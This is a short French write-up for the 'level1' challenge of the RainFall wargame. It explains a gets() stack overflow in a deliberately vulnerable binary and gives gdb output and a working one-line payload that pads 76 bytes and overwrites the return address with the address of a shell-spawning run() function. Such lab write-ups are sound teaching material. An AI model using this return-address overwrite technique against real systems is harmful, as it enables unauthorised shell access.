# Soluce

```
(python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat - ) | ./level1 
```

## Description du code

Le code contient une fonction nommé run qui lance un shell mais qui n'est pas apeler, et le main qui lis sur l'entrée standard avec gets() et stock le tout dans une string de 76 case memoire, cela risque d'overflow si l'on passe une string de plus de 76 char.

## Decription de l'exploit
```
level1@RainFall:~$ gdb ./level1 
(gdb) run 
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) info r
(...)
eip            0x63413563       0x63413563
(...)
```

Cela overflow, et overwrite l'adresse de reour on va pouvoir remplacer l'adress de retour par l'adresse de run :

```
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
(gdb) run 
```

## Payload

[Padding de 76] + [Adrresse de run] 

tips : 
utiliser cat - pour garder le shell ouvert lorsque il est executer